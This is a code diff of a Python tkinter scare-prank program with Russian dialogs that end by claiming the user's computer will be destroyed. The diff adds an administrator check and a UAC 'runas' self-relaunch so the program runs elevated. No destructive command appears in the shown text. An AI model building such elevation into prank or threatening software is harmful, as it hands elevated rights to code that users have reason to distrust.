@@ -2,6 +2,11 @@ from os import system
 from tkinter import *
 from random import *
 
+def isAdmin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
 def createLabel(text, window):
     '''Создание надписи'''
     label = Label(window, text=text, font=('Arial', 30))
@@ -43,11 +48,14 @@ def createNewWindow(i):
     global counter
     counter += 1
 
-windows = []
-labelTexts = ['Вы хотите узнать самый\n главный секрет Вселенной?', 'Вы точно уверены?', 'Вы вряд ли сможете оправиться\n после этого секрета', 'Хорошо, вы готовы?',
-              'Я так подумал.\n Вы не готовы.\n Программа будет закрыта,\n а ваш компьютер уничтожен']
-buttonTexts = ['Да!', 'Абсолютно уверен!', 'Я желаю узнать его', 'Готов!', '']
-counter = 1
-window = createWindow(labelTexts[0], buttonTexts[0], 0)
+if isAdmin():
+    windows = []
+    labelTexts = ['Вы хотите узнать самый\n главный секрет Вселенной?', 'Вы точно уверены?', 'Вы вряд ли сможете оправиться\n после этого секрета', 'Хорошо, вы готовы?',
+                  'Я так подумал.\n Вы не готовы.\n Программа будет закрыта,\n а ваш компьютер уничтожен']
+    buttonTexts = ['Да!', 'Абсолютно уверен!', 'Я желаю узнать его', 'Готов!', '']
+    counter = 1
+    window = createWindow(labelTexts[0], buttonTexts[0], 0)
 
-window.mainloop()
+    window.mainloop()
+else:
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
